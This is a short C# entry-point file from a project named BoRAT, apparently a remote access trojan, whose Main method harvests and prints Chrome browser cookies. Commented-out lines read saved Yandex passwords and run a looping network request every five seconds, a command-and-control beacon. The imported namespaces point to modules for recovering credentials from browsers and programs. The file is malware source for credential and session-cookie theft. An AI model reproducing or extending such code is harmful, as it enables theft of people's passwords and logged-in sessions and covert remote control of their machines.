using System;
using BoRAT.Core.Network;
using BoRAT.Core.Recovery.Programs;
using BoRAT.Core.Data;
using BoRAT.Core.Recovery.Browsers;

namespace BoRAT
{
    class Program
    {
        static void Main(string[] args)
        {
            //foreach (RecoveredAccount acc in Yandex.GetSavedPasswords())
            //    Console.Write(acc.ToString());

            foreach (Cookie acc in Chrome.GetCookies())
                Console.Write(acc.ToString());

            //while(true)
            //{
            //    Http.Request();
            //    Thread.Sleep(5000);
            //}

            Console.ReadKey();
        }

      
    }
}
